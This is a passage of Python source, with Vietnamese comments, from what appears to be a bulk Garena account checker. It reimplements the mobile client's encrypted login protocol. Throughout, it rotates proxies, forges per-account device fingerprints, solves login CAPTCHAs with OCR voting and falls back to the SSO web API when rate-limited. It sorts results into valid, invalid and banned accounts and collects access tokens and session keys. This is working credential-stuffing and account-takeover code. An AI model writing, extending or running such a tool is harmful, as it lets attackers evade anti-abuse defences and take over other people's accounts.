            url = f"http://{user}:{pw}@{ip}:{port}"
        else:
            url = f"http://{ip}:{port}"
    return {"http": url, "https": url}

def _connect_via_socks5(sock, dest_host: str, dest_port: int, user=None, pw=None):
    """Perform SOCKS5 handshake on an already-connected socket. Raises on failure."""
    def _recv_exact(size: int) -> bytes:
        buf = b''
        while len(buf) < size:
            chunk = sock.recv(size - len(buf))
            if not chunk:
                raise ConnectionError("SOCKS5 proxy closed connection")
            buf += chunk
        return buf

    # Greeting: support NO_AUTH and USER/PASS
    if user and pw:
        sock.sendall(b'\x05\x02\x00\x02')
    else:
        sock.sendall(b'\x05\x01\x00')
    # Server method selection
    resp = _recv_exact(2)
    if resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid version: {resp[0]}")
    method = resp[1]
    if method == 0xFF:
        raise ConnectionError("SOCKS5 no acceptable auth method")
    # Username/password auth (sub-negotiation)
    if method == 2:
        if not (user and pw):
            raise ConnectionError("SOCKS5 proxy requires auth but no credentials provided")
        u = user.encode('utf-8')
        p = pw.encode('utf-8')
        auth_req = bytes([1, len(u)]) + u + bytes([len(p)]) + p
        sock.sendall(auth_req)
        auth_resp = _recv_exact(2)
        if auth_resp[1] != 0:
            raise ConnectionError(f"SOCKS5 auth failed: status={auth_resp[1]}")
    elif method != 0:
        raise ConnectionError(f"SOCKS5 unsupported method: {method}")
    # Connect request
    host_enc = dest_host.encode('utf-8')
    req = (b'\x05\x01\x00\x03' +
           bytes([len(host_enc)]) + host_enc +
           struct.pack('>H', dest_port))
    sock.sendall(req)
    # Connect response: VER, REP, RSV, ATYP, BND.ADDR, BND.PORT.
    head = _recv_exact(4)
    if head[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid response version: {head[0]}")
    if head[1] != 0:
        _socks5_errors = {
            1: 'general failure', 2: 'connection not allowed', 3: 'network unreachable',
            4: 'host unreachable', 5: 'connection refused', 6: 'TTL expired',
            7: 'command not supported', 8: 'address type not supported',
        }
        raise ConnectionError(f"SOCKS5 connect error: {_socks5_errors.get(head[1], head[1])}")
    atyp = head[3]
    if atyp == 1:
        _recv_exact(4)
    elif atyp == 3:
        addr_len = _recv_exact(1)[0]
        _recv_exact(addr_len)
    elif atyp == 4:
        _recv_exact(16)
    else:
        raise ConnectionError(f"SOCKS5 unsupported address type: {atyp}")
    _recv_exact(2)


def _connect_via_proxy(proxy, dest_host: str, dest_port: int, timeout: int = 20):
    """Create a TCP socket tunneled through a proxy.
    Auto-detects SOCKS5 vs HTTP CONNECT by probing SOCKS5 first.
    Falls back to HTTP CONNECT if SOCKS5 handshake fails.
    Caches detected proxy type per (ip, port) to skip re-probing.
    """
    import base64
    ip, port, user, pw = proxy
    key = (ip, port)
    cached_type = _proxy_type_cache.get(key)

    def _try_socks5():
        s = None
        try:
            s = _make_fast_socket(timeout)
            s.connect((ip, port))
            _connect_via_socks5(s, dest_host, dest_port, user, pw)
            return s
        except Exception:
            try:
                if s:
                    s.close()
            except Exception:
                pass
            raise

    def _try_http_connect():
        s = None
        try:
            s = _make_fast_socket(timeout)
            s.connect((ip, port))
            connect_line = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\n"
            if user and pw:
                cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
                connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
            connect_line += "\r\n"
            s.sendall(connect_line.encode())
            resp = b''
            while b'\r\n\r\n' not in resp:
                chunk = s.recv(4096)
                if not chunk:
                    raise ConnectionError("Proxy closed connection")
                resp += chunk
                if len(resp) > 8192:
                    raise ConnectionError("Proxy CONNECT response too large")
            status_line = resp.split(b'\r\n')[0].decode(errors='replace')
            if not re.match(r"^HTTP/\d(?:\.\d)?\s+200\b", status_line):
                raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
            return s
        except Exception:
            try:
                if s:
                    s.close()
            except Exception:
                pass
            raise

    # Use cached type if known
    if cached_type == 'socks5':
        try:
            return _try_socks5()
        except Exception:
            s = _try_http_connect()
            with _proxy_type_lock:
                _proxy_type_cache[key] = 'http'
            return s
    if cached_type == 'http':
        try:
            return _try_http_connect()
        except Exception:
            s = _try_socks5()
            with _proxy_type_lock:
                _proxy_type_cache[key] = 'socks5'
            return s

    prefer_http = _guess_proxy_type(port) == "http"
    if prefer_http:
        first, second = _try_http_connect, _try_socks5
        ok_type, fail_type = "http", "socks5"
    else:
        first, second = _try_socks5, _try_http_connect
        ok_type, fail_type = "socks5", "http"
    try:
        s = first()
        with _proxy_type_lock:
            _proxy_type_cache[key] = ok_type
        return s
    except Exception:
        pass
    s = second()
    with _proxy_type_lock:
        _proxy_type_cache[key] = fail_type
    return s


def _connect_garena_via_proxy(proxy, timeout: int = 20):
    """Tunnel through proxy to Garena, trying hostname + known IPs.
    
    Args:
        proxy: Proxy tuple (ip, port, user, password)
        timeout: Total timeout for all connection attempts combined
        
    Returns:
        (socket, destination) tuple
        
    Raises:
        Exception: If all connection attempts fail
    """
    import time
    last_exc = None
    dests = _garena_connect_targets()
    start_time = time.time()
    
    # Calculate per-destination timeout to ensure total doesn't exceed overall timeout
    per_dest_timeout = max(1, timeout // max(len(dests), 1))
    
    for i, dest in enumerate(dests):
        remaining_time = timeout - (time.time() - start_time)
        if remaining_time <= 0:
            raise ConnectionError(f"Total timeout of {timeout}s exceeded while connecting to Garena via proxy")
        
        try:
            # Use remaining time for this attempt, but at least 1 second
            attempt_timeout = max(1, min(per_dest_timeout, remaining_time))
            return _connect_via_proxy(proxy, dest, PORT, attempt_timeout), dest
        except Exception as exc:
            last_exc = exc
            continue
    
    if last_exc:
        raise last_exc
    raise ConnectionError("No Garena connect target")

# ── Protocol constants ──────────────────────────────────────────────────────
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION          = 283
CLIENT_TYPE             = 4352
CMD_LOGIN_PREPARE       = 256
CMD_LOGIN               = 257
CMD_LOGIN_INFO_GET      = 276
CMD_USER_BASIC_INFO_LIST_GET = 289
CMD_USER_FULL_INFO_LIST_GET  = 291
CMD_USER_GPP_INFO_LIST_GET   = 337
CMD_USER_ACCOUNT_INFO_GET    = 342
CMD_SSO_KEY_GET         = 442
CMD_SESSION_TOKEN_GET   = 278   # HTTP session_key for account/init & garenaapp APIs
CMD_APP_OAUTH_LOGIN     = 439
CMD_FB_USER_INFO_GET    = 467
CMD_C2S_REQUEST         = 2
LIEN_QUAN_APP_ID        = 100054
PACKET_VERSION          = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
# Per-command TCP timeout (seconds) — tránh 1 cmd treo làm mất sso_key phía sau
_TCP_CMD_TIMEOUT = 6

CLIENT_ID_MASK = 4354
_pkt_counter   = random.randint(0, 0x3FFFFF)
_pkt_counter_lock = __import__('threading').Lock()

DEVICE_PROFILES = [
    "SM-S938B ;Android 15;vi;vn;",       # Galaxy S25 Ultra
    "SM-S928B ;Android 14;vi;vn;",       # Galaxy S24 Ultra
    "SM-S918B ;Android 13;vi;vn;",       # Galaxy S23 Ultra
    "SM-S908E ;Android 13;vi;vn;",       # Galaxy S22 Ultra
    "SM-G998B ;Android 12;vi;vn;",       # Galaxy S21 Ultra
    "SM-F946B ;Android 14;vi;vn;",       # Galaxy Z Fold5
    "SM-F956B ;Android 14;vi;vn;",       # Galaxy Z Fold6
    "SM-A556E ;Android 14;vi;vn;",       # Galaxy A55
    "SM-A546E ;Android 13;vi;vn;",       # Galaxy A54
    "SM-A525F ;Android 12;vi;vn;",       # Galaxy A52
    "Pixel 9 Pro ;Android 15;vi;vn;",
    "Pixel 8 Pro ;Android 14;vi;vn;",
    "Pixel 8 ;Android 14;vi;vn;",
    "Pixel 7 ;Android 13;vi;vn;",
    "CPH2581 ;Android 14;vi;vn;",        # OnePlus 12
    "CPH2653 ;Android 15;vi;vn;",        # OnePlus 13
    "24030PN60G ;Android 14;vi;vn;",     # Xiaomi 14 Ultra
    "23127PN0CG ;Android 14;vi;vn;",     # Xiaomi 14
    "24129PN74G ;Android 15;vi;vn;",     # Xiaomi 15
    "23049PCD8G ;Android 14;vi;vn;",     # POCO F5
    "23113RKC6G ;Android 14;vi;vn;",     # POCO X6 Pro
    "M2102J20SG ;Android 11;vi;vn;",     # POCO X3 Pro
    "CPH2609 ;Android 14;vi;vn;",        # OPPO Find X7
    "CPH2573 ;Android 14;vi;vn;",        # OPPO Reno11
    "V2324A ;Android 14;vi;vn;",         # vivo X100 Pro
    "V2343 ;Android 14;vi;vn;",          # vivo V30
    "RMX3851 ;Android 14;vi;vn;",        # realme GT 6
    "RMX3370 ;Android 12;vi;vn;",        # realme GT Neo 2
]

MSDK_VERSIONS = ["5.12.1", "5.12.0", "5.11.2", "5.10.0"]
CHROME_MOBILE_VERSIONS = ["136.0.7103.87", "135.0.7049.111", "134.0.6998.136", "133.0.6943.121"]
CHROME_DESKTOP_VERSIONS = ["136.0.7103.114", "135.0.7049.115", "134.0.6998.178", "133.0.6943.142"]
DESKTOP_UA_PLATFORMS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; WOW64",
    "Macintosh; Intel Mac OS X 14_6_1",
    "X11; Linux x86_64",
]
def _begin_check_context(account: str, password: str = "", acc_idx: int = -1) -> None:
    """Stable per-account device fingerprint (UA + device_id) for one check session."""
    seed_src = f"{account}:{password}:{acc_idx}"
    seed = int(hashlib.md5(seed_src.encode("utf-8")).hexdigest()[:8], 16)
    rng = random.Random(seed)
    profile = rng.choice(DEVICE_PROFILES)
    model = profile.split(";", 1)[0].strip()
    android = "Android 14"
    m = re.search(r"Android\s+\d+", profile)
    if m:
        android = m.group(0)
    chrome = rng.choice(CHROME_MOBILE_VERSIONS)
    msdk_ver = rng.choice(MSDK_VERSIONS)
    _thread_ctx.device_profile = profile
    _thread_ctx.device_id = hashlib.md5(seed_src.encode("utf-8")).digest()
    _thread_ctx.msdk_ua = f"GarenaMSDK/{msdk_ver}({profile})"
    _thread_ctx.android_ua = (
        f"Mozilla/5.0 (Linux; {android}; {model}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
    )


def _ctx_device_id() -> bytes:
    dev_id = getattr(_thread_ctx, "device_id", None)
    if isinstance(dev_id, (bytes, bytearray)) and len(dev_id) == 16:
        return bytes(dev_id)
    return os.urandom(16)


def _random_device_profile() -> str:
    profile = getattr(_thread_ctx, "device_profile", None)
    if profile:
        return profile
    return random.choice(DEVICE_PROFILES)


def _random_garena_msdk_ua() -> str:
    ua = getattr(_thread_ctx, "msdk_ua", None)
    if ua:
        return ua
    return f"GarenaMSDK/{random.choice(MSDK_VERSIONS)}({_random_device_profile()})"


def _random_android_browser_ua() -> str:
    ua = getattr(_thread_ctx, "android_ua", None)
    if ua:
        return ua
    profile = _random_device_profile()
    model = profile.split(";", 1)[0].strip()
    android = "Android 14"
    m = re.search(r"Android\s+\d+", profile)
    if m:
        android = m.group(0)
    chrome = random.choice(CHROME_MOBILE_VERSIONS)
    return f"Mozilla/5.0 (Linux; {android}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"


def _random_desktop_browser_ua() -> str:
    platform = random.choice(DESKTOP_UA_PLATFORMS)
    chrome = random.choice(CHROME_DESKTOP_VERSIONS)
    return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"


def _next_id() -> int:
    global _pkt_counter
    with _pkt_counter_lock:
        _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
        return CLIENT_ID_MASK | _pkt_counter

# ── XTEA-CBC (little-endian blocks, matching Android JNI libcrypt.so) ────────
_XTEA_DELTA  = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v: int) -> int:
    """((v << 4) ^ (v >> 5)) truncated to 32 bits, matching C uint32_t shift."""
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC encrypt matching libcrypt.so: [E(R)][CBC blocks][check block]
    - First 8 bytes = E_ECB(R) where R is random
    - CBC uses E(R) as the initial chaining value
    - Check block = E_ECB(last_CT ^ (R + sum_of_all_PT_blocks)), 64-bit LE addition
    """
    pad  = 8 - len(data) % 8
    data = data + bytes([pad] * pad)

    # Generate random R, encrypt it as first output block
    R = struct.unpack('<Q', os.urandom(8))[0]
    R_bytes = struct.pack('<Q', R)
    enc_R = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', R_bytes), key))

    # CBC encrypt with E(R) as initial chain value
    prev = enc_R
    out  = bytearray(enc_R)       # first 8 bytes = E(R)
    pt_sum = R                    # accumulate R + all PT blocks
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk  = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1)
        last_ct = prev
        out.extend(prev)

    # Check block = E_ECB(last_CT ^ pt_sum)
    last_ct_val = struct.unpack('<Q', last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack('<Q', check_input)
    check_enc = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', check_bytes), key))
    out.extend(check_enc)
    return bytes(out)

def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC decrypt. Format: [E(R)][CBC blocks][check block]. Strip check, use E(R) as IV."""
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv   = data[:8]             # E(R) — used as CBC chain start
    body = data[8:-8]           # CBC ciphertext (strip check block)
    out  = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk  = body[i:i+8]
        v0, v1 = _xtea_dec_block(*struct.unpack('<2I', blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev))
        out.extend(plain)
        prev = blk
    # Strip PKCS7 padding
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

# ── Minimal protobuf encode/decode ────────────────────────────────────────────
def _varint_enc(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag: int, n: int) -> bytes:
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag: int, b: bytes) -> bytes:
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag: int, s: str) -> bytes:
    return _pf_bytes(tag, s.encode('utf-8'))

def _proto_decode(data: bytes) -> dict:
    """Decode protobuf fields. Repeated tags accumulate as lists."""
    fields = {}
    pos = 0

    def _store(fn, val):
        if fn in fields:
            prev = fields[fn]
            if isinstance(prev, list):
                prev.append(val)
            else:
                fields[fn] = [prev, val]
        else:
            fields[fn] = val

    while pos < len(data):
        try:
            key = 0; shift = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80): break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                _store(fn, val)
            elif wt == 2:
                ln = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                _store(fn, data[pos:pos+ln])
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields


def _proto_get(fields: dict, tag: int, default=None):
    """Get last value for a field (handles repeated list values)."""
    v = fields.get(tag, default)
    if isinstance(v, list):
        return v[-1] if v else default
    return v


def _proto_get_all(fields: dict, tag: int) -> list:
    """Get all values for a (possibly repeated) field."""
    v = fields.get(tag)
    if v is None:
        return []
    return v if isinstance(v, list) else [v]

# ── TCP framing ───────────────────────────────────────────────────────────────
def _build_frame(cmd: int, body: bytes) -> bytes:
    """Wire format: [4B LE total] [2B BE header_len] [ClientPacketHeader proto] [body proto]"""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +   # version
        _pf_varint(2, _next_id())       +   # id
        _pf_varint(3, CMD_C2S_REQUEST)  +   # command_type
        _pf_varint(4, cmd)              +   # command
        _pf_varint(6, int(time.time()))     # timestamp
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(payload)) + payload

def _recvall(sock, n: int, timeout: float = None) -> bytes:
    """Read exactly n bytes from socket with timeout protection.
    
    Args:
        sock: Socket to read from
        n: Number of bytes to read
        timeout: Maximum time to wait (default: use socket's timeout)
        
    Returns:
        Exactly n bytes
        
    Raises:
        ConnectionError: If connection dropped or timeout
        socket.timeout: If read operation times out
    """
    if timeout is not None:
        old_timeout = sock.gettimeout()
        sock.settimeout(timeout)
    
    try:
        buf = b''
        start_time = time.time()
        # Use socket's timeout for each recv operation
        while len(buf) < n:
            try:
                chunk = sock.recv(n - len(buf))
                if not chunk:
                    raise ConnectionError("Connection dropped")
                buf += chunk
                # Additional safety: if we're making no progress and timeout is reasonable, break
                if len(buf) < n and timeout is not None:
                    elapsed = time.time() - start_time
                    if elapsed >= timeout:
                        raise socket.timeout(f"Timeout after {timeout}s reading {n} bytes (got {len(buf)})")
            except socket.timeout:
                if timeout is not None:
                    elapsed = time.time() - start_time
                    if elapsed >= timeout:
                        raise socket.timeout(f"Total timeout after {timeout}s reading {n} bytes (got {len(buf)})")
                raise
        return buf
    finally:
        if timeout is not None:
            try:
                sock.settimeout(old_timeout)
            except Exception:
                pass

def _recv_frame(sock, timeout: float = None) -> tuple:
    """Returns (header_fields_dict, body_bytes)
    
    Args:
        sock: Socket to read from
        timeout: Timeout for socket operations (None uses socket's timeout)
    """
    size    = struct.unpack('<I', _recvall(sock, 4, timeout))[0]
    payload = _recvall(sock, size, timeout)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    raw_hdr = _proto_decode(payload[2:2+hdr_len])
    # Scalar-normalize header tags (version/id/cmd/result/timestamp)
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v)
           for k, v in raw_hdr.items()}
    body    = payload[2+hdr_len:]
    return hdr, body

def _recv_cmd_frame(sock, target_cmd: int, max_tries: int = 5, timeout: float = None) -> tuple:
    """Read frames until target command is found (skip spontaneous pushes).
    
    Args:
        sock: Socket to read from
        target_cmd: Command ID to look for
        max_tries: Maximum number of frames to read
        timeout: Timeout for socket operations (None uses socket's timeout)
    """
    last_hdr, last_body = {5: -1}, b''
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock, timeout)
        last_hdr, last_body = hdr, body
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return last_hdr, last_body

# ── Login messages ────────────────────────────────────────────────────────────
def _account_type(account: str) -> int:
    if account.isdigit():
        return 3   # ACCOUNT_MOBILE
    if '@' in account:
        return 2   # ACCOUNT_EMAIL
    try:
        int(account)
        return 0   # ACCOUNT_UID
    except ValueError:
        return 1   # ACCOUNT_USERNAME

def _build_login_prepare(account: str, rand_key: bytes, captcha_key: str = "", captcha: str = "") -> bytes:
    inner = (
        _pf_varint(1, 0)                      +  # auth_type = AUTH_PASSWORD
        _pf_varint(2, _account_type(account)) +  # account_type
        _pf_str(3, account)                   +  # account
        _pf_varint(4, CLIENT_TYPE)            +  # client_type
        _pf_varint(5, CLIENT_VERSION)            # client_version
    )
    if captcha_key:
        inner += _pf_str(7, captcha_key)
    if captcha:
        inner += _pf_str(8, captcha)
        
    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)

def _solve_garena_captcha(proxy_dict=None):
    """Generate key, download image and solve using ensemble (4 methods + majority vote)."""
    if ddddocr is None or not HAS_REQUESTS:
        return "", ""
    
    captcha_key = str(uuid.uuid4()).replace("-", "")
    url = f"http://captcha.garena.com/image?key={captcha_key}"
    if not _QUIET_BULK:
        with _print_lock:
            print(_c(C.YELLOW, f"  [+] CAPTCHA URL: {url}"))
    
    try:
        resp = _requests.get(url, proxies=proxy_dict, timeout=5, verify=False)
        if resp.status_code != 200:
            return "", ""
        
        content = resp.content
        _ensure_captcha_libs()
        
        if cv2 is not None and _np is not None:
            try:
                from collections import Counter
                nparr = _np.frombuffer(content, _np.uint8)
                img_color = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                # Resize 3x de tang do chinh xac OCR
                img_color = cv2.resize(img_color, (0, 0), fx=3, fy=3,
                                       interpolation=cv2.INTER_CUBIC)
                img_gray = cv2.cvtColor(img_color, cv2.COLOR_BGR2GRAY)
                
                ocr = ddddocr.DdddOcr(show_ad=False, beta=True)
                results = []
                
                # Phuong phap 1: Anh goc mau (khong xu ly)
                _, buf1 = cv2.imencode('.png', img_color)
                r1 = ocr.classification(buf1.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r1.upper()))
                
                # Phuong phap 2: HSV mask mau xanh lam (100-130)
                hsv = cv2.cvtColor(img_color, cv2.COLOR_BGR2HSV)
                mask = cv2.inRange(hsv, _np.array([90, 50, 50]), _np.array([130, 255, 255]))
                final2 = cv2.bitwise_not(mask)
                _, buf2 = cv2.imencode('.png', final2)
                r2 = ocr.classification(buf2.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r2.upper()))
                
                # Phuong phap 3: Adaptive Threshold (tot voi nhieu duong ke)
                blur = cv2.GaussianBlur(img_gray, (3, 3), 0)
                thresh3 = cv2.adaptiveThreshold(blur, 255,
                                                cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
                                                cv2.THRESH_BINARY_INV, 15, 6)
                final3 = cv2.bitwise_not(thresh3)
                _, buf3 = cv2.imencode('.png', final3)
                r3 = ocr.classification(buf3.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r3.upper()))
                
                # Phuong phap 4: Otsu Threshold
                _, thresh4 = cv2.threshold(img_gray, 0, 255,
                                           cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)
                final4 = cv2.bitwise_not(thresh4)
                _, buf4 = cv2.imencode('.png', final4)
                r4 = ocr.classification(buf4.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r4.upper()))
                
                # Lay ket qua xuat hien nhieu nhat (majority vote)
                valid = [r for r in results if len(r) >= 5]
                if valid:
                    res = Counter(valid).most_common(1)[0][0]
                else:
                    res = Counter(results).most_common(1)[0][0]
                
                return captcha_key, res
            except Exception:
                pass
        
        # Fallback: Pillow neu khong co OpenCV
        if Image is not None:
            try:
                img = Image.open(BytesIO(content)).convert('L')
                img = img.filter(ImageFilter.MedianFilter(size=3))
                img = img.point(lambda p: 0 if p < 140 else 255)
                buf = BytesIO()
                img.save(buf, format='PNG')
                content = buf.getvalue()
            except Exception:
                pass
        
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification(content)
        if res:
            res = re.sub(r'[^A-Z0-9]', '', res.upper())
        return captcha_key, res
    except Exception:
        pass
    return "", ""


def _derive_login_key(password: str, salt: str, verify_code: str):
    """Matches login/b/b.java 3-arg constructor exactly.
    strA = MD5hex(password)
    xtea_key = SHA256(hex(SHA256(strA + salt)) + verify_code)[:16]
    pw_hash  = strA.encode('ascii')
    """
    md5hex     = hashlib.md5(password.encode('utf-8')).hexdigest()
    inner_raw  = hashlib.sha256((md5hex + salt).encode('utf-8')).digest()
    inner_hex  = inner_raw.hex()
    xtea_key   = hashlib.sha256((inner_hex + verify_code).encode('utf-8')).digest()[:16]
    pw_hash    = md5hex.encode('ascii')
    return xtea_key, pw_hash

# ── Mã lỗi từ GxxData.Constant.Result (login/d.java, AnonymousClass8) ─────────
# result=1 → ERROR_AUTH       → sai mật khẩu (thường ở CMD LOGIN 257, ít gặp ở PREPARE)
# result=2 → ERROR_ACCOUNT_NOT_EXIST → không có tài khoản
# result=3 → ERROR_CAPTCHA    → server yêu cầu CAPTCHA (bị rate-limit/block IP)
# result=4 → ERROR_AUTH_USER_BAN → tài khoản bị ban
# result=5 → ERROR_AUTH_SECURITY_BAN → bị ban bảo mật
# result=101/105/174 → GXX từ chối identity (username không tồn tại trên mconnect /
#   không phải acc Garena GXX / đã xóa / sai định dạng). CHƯA kiểm tra mật khẩu.
_PREPARE_RESULT_MAP = {
    1: "INVALID",   # ERROR_AUTH - sai pass
    2: "NOT_FOUND", # ERROR_ACCOUNT_NOT_EXIST
    3: "CAPTCHA",   # ERROR_CAPTCHA - bị rate-limit, dùng HTTP fallback
    4: "BANNED",    # ERROR_AUTH_USER_BAN
    5: "SEC_BANNED",# ERROR_AUTH_SECURITY_BAN
    101: "MISS",
    105: "MISS",
    174: "MISS",
}
_PREPARE_SKIP_CODES = frozenset({101, 105, 174})
_PREPARE_HTTP_FALLBACK_CODES = frozenset({3, 101, 105, 174})

def _http_login_garena(account: str, password: str, app_id: int = 100054,
                       proxy=None, timeout: int = 15) -> dict:
    """HTTP API login fallback - dùng khi TCP bị CAPTCHA (result=3).

    Thử lần lượt:
      1) prelogin AES (app_id=10100 Account Center) → session_key + access_token
      2) plain MD5 login (legacy MSDK / game app_id)

    Trả về dict với access_token / session_key / open_id nếu thành công,
    hoặc {'error': ..., 'error_code': ...} nếu thất bại.
    """
    if not HAS_REQUESTS:
        return {'error': 'requests not available'}

    def _parse_login_resp(resp) -> dict:
        if resp is None:
            return {}
        # Redirect: access_token / session_key / open_id in Location
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get('Location', '') or ''
            m = re.search(r'access_token=([^&]+)', loc)
            m_uid = re.search(r'open_id=([^&]+)', loc)
            m_sk = re.search(r'session_key=([^&]+)', loc)
            out = {}
            if m:
                out['access_token'] = urllib.parse.unquote(m.group(1))
            if m_uid:
                out['open_id'] = urllib.parse.unquote(m_uid.group(1))
            if m_sk:
                out['session_key'] = urllib.parse.unquote(m_sk.group(1))
            if out:
                out['_method'] = 'http'
                return out
        if resp.status_code == 200:
            try:
                data = resp.json()
            except Exception:
                data = None
            if isinstance(data, dict):
                if data.get('access_token') or data.get('session_key') or data.get('uid'):
                    out = {'_method': 'http'}
                    if data.get('access_token'):
                        out['access_token'] = data['access_token']
                    if data.get('session_key'):
                        out['session_key'] = data['session_key']
                    if data.get('open_id') is not None:
                        out['open_id'] = str(data.get('open_id', ''))
                    if data.get('uid') is not None:
                        out['uid'] = data.get('uid')
                        if 'open_id' not in out:
                            out['open_id'] = str(data.get('uid'))
                    # session_key alone is enough for account center (HIT)
                    if out.get('access_token') or out.get('session_key'):
                        return out
                return {
                    'error': data.get('error_description', data.get('error', 'unknown')),
                    'error_code': data.get('error', ''),
                }
        return {}

    md5pw = hashlib.md5(password.encode('utf-8')).hexdigest()
    headers = {
        'User-Agent': _random_garena_msdk_ua(),
        'Accept': 'application/json',
    }
    proxies = _get_http_proxies(proxy)
    last_err = {'error': 'http_login_failed'}

    # ── Path 1: prelogin AES @ app_id 10100 (stable for account center) ──
    try:
        sess = _requests.Session()
        sess.verify = False
        if proxies:
            sess.proxies = proxies
        pre = sess.get(
            "https://sso.garena.com/api/prelogin",
            params={
                "account": account,
                "format": "json",
                "id": str(int(time.time() * 1000)),
                "app_id": "10100",
            },
            headers=headers,
            timeout=timeout,
        )
        pdata = {}
        try:
            pdata = pre.json() if pre.status_code == 200 else {}
        except Exception:
            pdata = {}
        enc_pw = md5pw
        if isinstance(pdata, dict) and pdata.get("v1") and pdata.get("v2"):
            enc = _garena_aes_encode_password(md5pw, str(pdata["v1"]), str(pdata["v2"]))
            if enc:
                enc_pw = enc
        for login_app in ("10100", str(app_id)):
            resp = sess.get(
                "https://sso.garena.com/api/login",
                params={
                    "app_id": login_app,
                    "account": account,
                    "password": enc_pw,
                    "redirect_uri": "https://account.garena.com/",
                    "format": "json",
                    "id": str(int(time.time() * 1000)),
                },
                headers=headers,
                timeout=timeout,
                allow_redirects=False,
            )
            parsed = _parse_login_resp(resp)
            if parsed.get("access_token") or parsed.get("session_key"):
                return parsed
            if parsed.get("error_code"):
                last_err = parsed
    except Exception as exc:
        last_err = {'error': str(exc)}

    # ── Path 2: legacy plain MD5 (some game app_id endpoints) ──
    try:
        resp = _requests.get(
            "https://sso.garena.com/api/login",
            params={
                'app_id': str(app_id),
                'account': account,
                'password': md5pw,
                'redirect_uri': 'https://account.garena.com/',
                'format': 'json',
                'id': str(int(time.time() * 1000)),
            },
            headers=headers,
            timeout=timeout, verify=False,
            proxies=proxies,
            allow_redirects=False,
        )
